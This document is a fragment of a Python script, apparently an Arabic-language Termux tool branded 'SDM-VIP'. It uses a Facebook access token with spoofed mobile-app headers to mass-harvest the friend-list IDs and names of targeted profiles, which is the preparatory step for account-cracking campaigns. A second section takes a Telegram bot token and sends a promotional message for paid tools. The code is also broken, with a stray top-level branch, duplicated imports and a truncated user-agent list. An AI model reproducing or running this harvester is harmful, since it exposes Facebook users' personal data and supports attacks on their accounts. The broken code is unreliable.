⠀⠀⠀⠀⠀⠀⠀⢰⡀⠘⢯⣳⢶⠦⣧⢷⢗⣫⠇⠀⡸⠀         ⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠑⢤⡀⠈⠋⠛⠛⠋⠉⢀⡠⠒⠁         ⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢦⠀⢀⣀⠀⣠⠞⠁        ⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠀      ⠀⠀⠀⠀⠀⠀
''')    
    	print(f"""
  \033[1;32m  [\033[1;37m1\033[1;32m] \x1b[1;37m- Create File Ids - صنع ملف ايديات

  \033[1;32m  [\033[1;37m2\033[1;32m] \x1b[1;37m- Change Token - تغيير توكن

  \033[1;32m  [\033[1;37m3\033[1;32m] \x1b[1;37m- Delete Ids Double - حدف ايديات مكررة   """)
    	print('')
    	xo = input(f' \033[1;32m   [\033[1;37m•\033[1;32m] \x1b[1;37mEnter :')
    	if xo in ['1']:
    		file_create_menu().file_unlimmited()
    	if xo in ['2']:
    		os.system('rm -rf المبرمج نمرود')
    		linex()
    	
    		os.system('rm -rf لاتنسى صور الصيد')
    		linex()
    		print('')
    		M_T_F(f"\033[1;32m[\033[1;37m-\033[1;32m] Token Has Been Deleted √")
    		exit()
    	if xo in ['3']:
    		print('')    	
    		file_path = input(f"{P} \x1b[1;94m[\x1b[1;97m√\x1b[1;94m]\x1b[1;94m \x1b[1;97m File Path :")
    	else:
    		linex()
    		M_T_F(f'{a1} - Wrong Choice ')
    		time.sleep(1)
    		main_menu()
    siid=[]
    sep=[]
     
    class file_create_menu():
    	def file_simple(self):
    		os.system('clear');print(logo)
    		try:
    			print(f' [•] WRITE FILE NAME WITHOUT /sdcard ')
    			nm  = input(f' [•] ENTER FILE NAME : ').replace(' ','_')
    			lk = '/sdcard/Download/Telegram/'
    			lok = '%s%s'%(lk,nm)
    			open(lok,'w')
    		except FileNotFoundError:
    			print(f' [×] LOCATION NOT FOUND TRY AGAIN !! ')
    			time.sleep(2)
    			back()
    		except IsADirectoryError:
    			time.sleep(1)
    			file_create_menu().file_simple()
    		if IOError:
    			pass
    			print(f' [•] PASTE UID ONE BY ONE ')
    			linex()
    			while True:
    				ids_all = input(f" [>] ENTER UID : ")
    				if ids_all == "":
    					linex()
    					print(f' [•] FILE SAVE AS : {lok} ')
    					input(f' [>] PRESS ENTER TO BACK ')
    					back()
    					break
    				try:
    					uid = ids_all.split("|")[0]
    				except:
    					uid = ids_all
    				try:
    					headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
    							   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
    							   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
    							   "Authorization": "OAuth "+self.token+"",
    							   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
    							   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
    							   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
    							   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
    							   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
    							   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
    							   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
    							   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
    					data = {
    						'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
    						'client_doc_id': client_id,
    						'method': 'post',
    						'locale': 'en_US',
    						'pretty': 'false',
    						'format': 'json',
    						'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
    						'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
    						'fb_api_caller_class': 'graphservice',
    						'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
    						'client_trace_id': trace_id,
    						'server_timestamps': 'true',
    						'purpose': 'fetch'
    					}
    					posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
    					try:
    						data = posted['data']['user']['friends']['edges']
    					except:
    						print(f' \033[1;35m SOMETHING WRONG WITH {uid}\033[0m ')
    					if len(data) < 100:
    						print(f' [×] PRIVATE FRIENDLIST OF {uid} ')
    						linex()
    					else:
    						for edge in data:
    							node = edge['node']
    							open(lok, 'a', encoding='utf-8').write(node['id'] + "|" + node['name'] + '\n')
    						try:
    							total_idss=len(open(lok,'r').readlines())
    						except:
    							total_idss='-'
    						print(f' [•] SUCESSFULLY EXTRACTED {uid} [{total_idss}] \033[0m')
    						linex()
    				except KeyError:
    					pass
    				except requests.exceptions.ConnectionError:
    					input(f" [×] CONNECTION ERROR - PRESS ENTER TO CONTINUE")
    	def __init__(self):
    		try:
    			print('')
    		except:
    			pass
    		self.ids = []
    		self.total = []
    		self.loop = 0
    		try:
    			self.token = open('.token.txt', 'r').read()
    			uid="100061689760374"
    			try:
    				headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
    						   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
    						   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
    						   "Authorization": "OAuth "+self.token+"",
    						   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
    						   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
    						   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
    						   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
    						   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
    						   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
    						   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
    						   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
    				data = {
    					'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
    					'client_doc_id': client_id,
    					'method': 'post',
    					'locale': 'en_US',
    					'pretty': 'false',
    					'format': 'json',
    					'variables': '{"profile_id":'+uid+',"suggestion_friends_paginating_first":2500}',
    					'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
    					'fb_api_caller_class': 'graphservice',
    					'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
    					'client_trace_id': trace_id,
    					'server_timestamps': 'true',
    					'purpose': 'fetch'
    				}
    				posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
    				if not posted['data']['user']['friends']['edges']:
    				    os.system('clear');print(logo)
    				    os.system('.token.txt')
    				try:
    					data = posted['data']['user']['friends']['edges']
    				except:
    					print(f' \033[1;31m SOMETHING WRONG WITH THIS ID \033[0m ')
    					os.system('.token.txt')
    					exit()
    			except Exception as e:
    				os.system('clear');print(logo)
    				print(f" [{B}×{W}] COOKIES EXPRIED !")
    				print(e)
    				login.login_WALA('')
    		except Exception as e:
    			print(e)
    			login.login_WALA('')
    	def file_unlimmited(self):
    		os.system('clear')
    		from pyfiglet import Figlet as F; from random import choice as c; print("\033[92m" + F(c(["slant"])).renderText("SDM1"))
    		print("•" *60)
    		limit = int("1")
    		try:
    			print(f"Enter The File Name √ \n\n Exemple : Besto.txt ♕ اكتب اسم الملف ")
    			nm  = input(f'\033[1;32m[\033[1;37m•\033[1;32m] Enter The File Name :').replace(' ','_')
    			lk = '/sdcard/'
    			lok = '%s%s'%(lk,nm)
    			open(lok,'w')
    		except FileNotFoundError:
    			print(f'ENER THE FILE NAME WITH (.txt) ')
    			time.sleep(1)
    			back()
    		except IsADirectoryError:
    			time.sleep(1)
    			file_create_menu().file_simple()
    		if IOError:
    			pass
    			os.system('clear')
    			try:
    				file = open('.temp.txt', 'r').read().splitlines()
    			except:
    				file = []
    			os.system('clear')
    			print(SDMVIP)
    			print(f"{a40}—"*60)
    			for i in range(int(limit)):
    				uid = input(f" - Enter ID :".format(i+1))
    				try:
    					headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
    							   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
    							   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
    							   "Authorization": "OAuth " + self.token + "",
    							   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
    							   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
    							   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
    							   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
    							   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
    							   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
    							   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
    							   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
    					data = {
    						'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
    						'client_doc_id': client_id,
    						'method': 'post',
    						'locale': 'en_US',
    						'pretty': 'false',
    						'format': 'json',
    						'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
    						'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
    						'fb_api_caller_class': 'graphservice',
    						'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
    						'client_trace_id': trace_id,
    						'server_timestamps': 'true',
    						'purpose': 'fetch'
    					}
    					posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
    					try:
    						data = posted['data']['user']['friends']['edges']
    					except:
    						print(f'')
    					if len(data) < 100:
    						print('')
    					else:
    						for edge in data:
    							node = edge['node']
    							open('.a.txt', 'a', encoding='utf-8').write(node['id'] + '\n')
    							idss = len(open('.a.txt','r').readlines())
    						print(f'[{idss}]\033[0m')
    				except KeyError:
    					pass
    				except requests.exceptions.ConnectionError:
    					input(f"YOU HAVE BAD NET PRESS ENTER:")
    			try:
    				file = open('.a.txt', 'r').read().splitlines()
    			except:
    				file = [] 
    			os.system('clear')
    			print(SDMVIP) 
    			
    			print(f"{a40}—"*60)
    			print(f'{P} \x1b[1;94m[\x1b[1;97m√\x1b[1;94m]\x1b[1;94m \x1b[1;97m You Have ' + str(len(file))+' Ids')
    			
    			
    			linex()
    			for uid in file:
    				try:
    					headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
    							   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
    							   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
    							   "Authorization": "OAuth " + self.token + "",
    							   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
    							   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
    							   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
    							   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
    							   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
    							   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
    							   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
    							   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
    					data = {
    						'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
    						'client_doc_id': client_id,
    						'method': 'post',
    						'locale': 'en_US',
    						'pretty': 'false',
    						'format': 'json',
    						'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
    						'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
    						'fb_api_caller_class': 'graphservice',
    						'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
    						'client_trace_id': trace_id,
    						'server_timestamps': 'true',
    						'purpose': 'fetch'
    					}
    					posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
    					try:
    						data = posted['data']['user']['friends']['edges']
    					except:
    						continue
    					if len(data) < 100:
    						continue
    					else:
    						for edge in data:
    							node = edge['node']
    							open(lok, 'a', encoding='utf-8').write(node['id'] + "|" + node['name'] + '\n')
    						if 'y' in sep:
    							perfector(lok)
    						try:
    							total_idss=len(open(lok,'r').readlines())
    						except:
    							total_idss='-'
    						print(f'{P} \x1b[1;94m[\x1b[1;97m√\x1b[1;94m]\x1b[1;94m \x1b[1;97m Id Coolected  ➩ {total_idss}) ')
    				except KeyError:
    					pass
    				except requests.exceptions.ConnectionError:
    					continue
    			print('DONE'.format(lok))
    			
    			print('M_T_F'.format(len(open(lok,'r').read().splitlines())))
    			
    main_menu()

elif M_T_F=='2':import requests,bs4,json,os,sys,random,datetime,time,re
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import sleep
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import webbrowser
webbrowser.open('')
from datetime import *
        
try:
        
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import sleep
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
from rich.text import Text as tekz;from rich.progress import track

        
try:
        
        import rich
except ImportError:
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
print(B+SDMVIP)
BVIP ='𝐒𝐃𝐌-𝐕𝐈𝐏 || المبرمج نمرود  @M_T_F '
statusok1 = nel(BVIP, style='		       yellow')
cetak(nel(statusok1, title=''))
print('')
print(('━'*32)+'\n• ❅─────✧❅ 𓆩𝐒𝐃𝐌-𝐕𝐈𝐏𓆪 ❅────────✧❅\n'+('━'*25))
token = input(f'{X}TOKEN\x1b[1;35m :\x1b[1;32m ')
print('\n')
ID = input(f'{X}ID \x1b[1;32m   : ')
SDM1 = '\nنورت حياتي اداة نمرود المجانية\n قناتي @py_1hon \n للاشتراك في ادواتي المدفوعة راسلني @M_T_F '
requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(SDM1))
os.system('clear')
pretty.install()
CON = sol()
os.system('clear')
cetak(nel('\t• Sedang Menginstall Modul Requests •'))

pretty.install()
CON=sol()
ugen=['Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.96 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; WOW64; Trident/5.0)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0)', 'Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (X11; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.121 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Win64; x64; Trident/5.0)', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/6.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.99 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; Trident/4.0)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 6.3; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.185 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 6.3; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.75 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.80 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.125 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:47.0) Gecko/20100101 Firefox/47.0']
ugen2=['Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.96 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; WOW64; Trident/5.0)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; 